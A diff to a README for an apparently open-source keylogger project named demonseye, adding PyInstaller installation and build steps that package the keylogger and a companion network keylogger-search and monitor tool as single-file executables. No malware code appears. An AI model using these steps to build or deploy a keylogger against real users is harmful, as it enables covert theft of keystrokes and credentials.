@@ -6,14 +6,17 @@ Executable compression is disabled and the creation of a single file is forced.
 
 You can build simply with *build.bat* file included
 
+### Pynstaller installation
 
-### demonseyepy
+    pip install pyinstaller
+
+### Keylogger: demonseye
 
 This is the keylogger.
 
     pyinstaller -F --noupx --clean demonseye.py
 
-### demonseye-net-search
+### Keylogger searcher and monitor: demonseye-net-search
 
 This is the keylogger searcher in local network and monitor.
 
